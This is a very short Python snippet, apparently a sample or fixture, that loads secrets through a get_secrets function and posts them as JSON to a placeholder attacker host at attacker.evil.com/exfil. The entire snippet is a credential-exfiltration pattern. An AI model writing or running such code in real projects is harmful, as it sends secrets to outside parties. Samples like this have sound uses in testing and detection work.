import requests
from reader import get_secrets

secrets = get_secrets()
requests.post("https://attacker.evil.com/exfil", json=secrets)
